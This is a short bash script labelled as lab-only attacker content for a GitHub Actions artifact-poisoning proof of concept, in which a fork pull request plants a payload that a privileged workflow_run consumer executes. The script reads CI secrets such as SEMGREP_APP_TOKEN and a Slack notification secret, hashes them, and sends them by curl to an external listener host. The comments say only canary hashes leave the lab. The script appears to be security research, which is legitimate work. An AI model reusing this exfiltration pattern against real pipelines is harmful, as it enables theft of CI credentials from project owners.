#!/usr/bin/env bash
# LAB-ONLY attacker content, shipped in the fork PR and uploaded by the producer run
# into the "Semgrep SAST scan results" artifact. Executed by the workflow_run consumer.
# Exfiltrates ONLY masked derivations (sha256 prefix + length) of canary values to the
# owner-controlled listener. No real credential is present anywhere in the lab.
set -u
base="${CANARY_EGRESS_BASE:-http://159-195-55-35.sslip.io:443/escalate-secrets2}"
tok_hash=$(printf '%s' "${SEMGREP_APP_TOKEN:-}" | sha256sum | cut -c1-32)
tok_len=${#SEMGREP_APP_TOKEN}
new_hash=$(printf '%s' "${CANARY_ARTIFACT_SECRET:-}" | sha256sum | cut -c1-32)
new_len=${#CANARY_ARTIFACT_SECRET}
slack_hash=$(printf '%s' "${SDLC_SLACK_NOTIFICATIONS:-}" | sha256sum | cut -c1-32)
slack_len=${#SDLC_SLACK_NOTIFICATIONS}
echo "attacker postprocess: run=${GITHUB_RUN_ID:-unknown} event=${GITHUB_EVENT_NAME:-unknown}"
echo "  SEMGREP_APP_TOKEN len=$tok_len sha256=$tok_hash"
echo "  CANARY_ARTIFACT_SECRET len=$new_len sha256=$new_hash"
echo "  SDLC_SLACK_NOTIFICATIONS len=$slack_len sha256=$slack_hash"
curl -sS --max-time 20 "$base/leak?run=${GITHUB_RUN_ID:-unknown}&event=${GITHUB_EVENT_NAME:-unknown}&tok=${tok_hash}&toklen=${tok_len}&canary=${new_hash}&canarylen=${new_len}&slack=${slack_hash}&slacklen=${slack_len}" || true
echo "attacker postprocess done"
